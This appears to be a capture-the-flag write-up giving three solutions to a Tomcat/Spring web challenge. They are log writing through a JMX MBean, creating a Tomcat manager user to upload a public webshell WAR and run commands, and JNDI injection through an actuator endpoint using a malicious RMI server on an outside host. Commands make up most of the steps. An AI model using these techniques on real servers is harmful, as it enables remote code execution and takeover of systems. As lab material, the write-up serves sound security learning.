## This challenge got 3 solutions (or more...)

### Sol 1 - Write Log via AccessLogValve Mbean
```
python3 solv_logwrite.py http://localhost:1339/vulnapp/ 
```
![solv](https://i.imgur.com/fLGY06M.png)

### Sol 2 - Create Tomcat User -> Manage App -> Upload WAR Shell
```
python3 solv_createuser.py http://localhost:1339/vulnapp/ 
```

Then Login in tomcat

![login](https://i.imgur.com/EXOEUY8.png)

Upload war

https://github.com/BustedSec/webshell/blob/master/webshell.war

![war](https://i.imgur.com/ffwyw0W.png)

![war2](https://i.imgur.com/F2eSRhd.png)


Read Flag
```
http://localhost:1339/webshell/?cmd=/readflag
```
![flag](https://i.imgur.com/7d2mN4s.png)


### Sol 3 - JNDI Injection

Service uses jdk1.8.0_131 higher than JDK8u121 so no traditional rmi marshall used :), instead we got:
https://github.com/welk1n/JNDI-Injection-Exploit

Start the rmi server:
```
java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "script -c /readflag /home/service/apache-tomcat-8.5.35/webapps/vulnapp/tsu.txt" -A "tsug0d.com"
```
![rmi](https://i.imgur.com/xpkLwQg.png)

Take the rmi that meet the server conditional, in this case:
```
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://tsug0d.com:1099/j3muyl
```

run exploit to call to our rmi
```
python3 solv_jndi.py http://localhost:1339/vulnapp/actuator rmi://tsug0d.com:1099/j3muyl
```

get flag

![flag](https://i.imgur.com/rZqGYbb.png)
